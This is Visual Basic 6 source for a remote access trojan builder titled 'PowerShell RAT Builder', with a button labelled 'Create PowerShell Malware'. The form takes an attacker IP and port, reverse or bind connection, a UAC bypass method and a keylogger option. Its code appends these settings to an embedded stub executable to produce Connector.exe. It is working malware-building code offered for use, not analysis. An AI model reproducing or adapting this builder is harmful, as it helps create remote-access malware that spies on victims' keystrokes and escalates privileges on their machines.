VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   Caption         =   "PowerShell RAT Builder"
   ClientHeight    =   6870
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   12945
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6870
   ScaleWidth      =   12945
   StartUpPosition =   3  'Windows Default
   Begin ADEO.xFrame xFrame1 
      Height          =   6375
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   12735
      _ExtentX        =   22463
      _ExtentY        =   11245
      BackColor       =   16777215
      Caption         =   "Settings"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontSize        =   8,25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      HeaderGradientBottom=   12611136
      Begin VB.CommandButton jcbutton1 
         Caption         =   "Create PowerShell Malware"
         Height          =   375
         Left            =   120
         TabIndex        =   17
         Top             =   5880
         Width           =   12495
      End
      Begin ADEO.xFrame xFrame3 
         Height          =   1335
         Left            =   9000
         TabIndex        =   14
         Top             =   480
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   2355
         BackColor       =   16777215
         Caption         =   "Functions"
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
         Begin ADEO.Check Check2 
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   840
            Width           =   1575
            _ExtentX        =   2778
            _ExtentY        =   450
            Caption         =   "Screenshot"
            Enabled         =   0   'False
            ForeColor       =   12632256
            Caption         =   "Screenshot"
            ForeColor       =   12632256
         End
         Begin ADEO.Check Check1 
            Height          =   255
            Left            =   120
            TabIndex        =   15
            Top             =   480
            Width           =   1575
            _ExtentX        =   2778
            _ExtentY        =   450
            Caption         =   "Keylogger"
            ForeColor       =   0
            Caption         =   "Keylogger"
         End
      End
      Begin ADEO.xFrame xFrame2 
         Height          =   1335
         Left            =   6600
         TabIndex        =   11
         Top             =   480
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   2355
         BackColor       =   16777215
         Caption         =   "Arch"
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
         Begin VB.OptionButton Option4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "x64 Based Exe"
            Height          =   255
            Left            =   240
            TabIndex        =   13
            Top             =   840
            Value           =   -1  'True
            Width           =   1935
         End
         Begin VB.OptionButton Option3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "x86 Based Exe"
            Height          =   255
            Left            =   240
            TabIndex        =   12
            Top             =   480
            Width           =   1695
         End
      End
      Begin VB.ListBox List1 
         Height          =   3765
         ItemData        =   "Form1.frx":6852
         Left            =   120
         List            =   "Form1.frx":688C
         TabIndex        =   9
         Top             =   2040
         Width           =   12495
      End
      Begin VB.OptionButton Option2 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Bind Connection"
         Height          =   255
         Left            =   4680
         TabIndex        =   8
         Top             =   1320
         Width           =   1695
      End
      Begin VB.OptionButton Option1 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Reverse Connection"
         Height          =   255
         Left            =   1920
         TabIndex        =   7
         Top             =   1320
         Value           =   -1  'True
         Width           =   2295
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1920
         TabIndex        =   6
         Text            =   "443"
         Top             =   930
         Width           =   855
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1920
         TabIndex        =   5
         Text            =   "1.1.1.1"
         Top             =   570
         Width           =   1935
      End
      Begin VB.Image Image1 
         Height          =   1185
         Left            =   10920
         Picture         =   "Form1.frx":7097
         Top             =   600
         Width           =   1680
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Connection Type:"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1320
         Width           =   1695
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "UAC Bypass Method:"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   1680
         Width           =   1695
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Port:"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   960
         Width           =   855
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "IP:"
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   600
         Width           =   1215
      End
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "www.adeosecurity.com"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   6600
      Width           =   12735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub jcbutton1_Click()
On Error Resume Next
Dim Stub() As Byte
Dim ConnectionType As String
Dim UACBypassTeknik As String
Dim YazilacakString As String
Dim Keylogger As String

Kill App.Path & "\Connector.exe"
Kill App.Path & "\Stub.exe"

If Option3.Value = True Then
Stub() = LoadResData(101, "CUSTOM")
ElseIf Option4.Value = True Then
Stub() = LoadResData(102, "CUSTOM")
End If

If Option1.Value = True Then
ConnectionType = "Reverse"
Else
ConnectionType = "Bind"
End If

If Check1.Value = Checked Then
Keylogger = "1"
Else
Keylogger = "0"
End If

UACBypassTeknik = List1.ListIndex + 1
YazilacakString = "<SplitCode>" & Text1.Text & "<SplitCode>" & Text2.Text & "<SplitCode>" & ConnectionType & "<SplitCode>" & UACBypassTeknik & "<SplitCode>" & Keylogger & "<SplitCode>"

Open App.Path & "\Stub.exe" For Binary As #1
Put #1, , Stub()
Close #1

Open App.Path & "\Connector.exe" For Binary As #1
Put #1, , STRING_TO_BYTES(LoadFile(App.Path & "\Stub.exe") & YazilacakString)
Close #1

Kill App.Path & "\Stub.exe"

MsgBox "Done!"
End Sub
Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim FF As Integer
    FF = FreeFile
    On Error Resume Next
    Open sPath For Binary Access Read As #FF
    lFileSize = LOF(FF)
    sData = Input$(lFileSize, FF)
    Close #FF
    LoadFile = sData
End Function
Public Function STRING_TO_BYTES(sString As String) As Byte()
  STRING_TO_BYTES = StrConv(sString, vbFromUnicode)
End Function

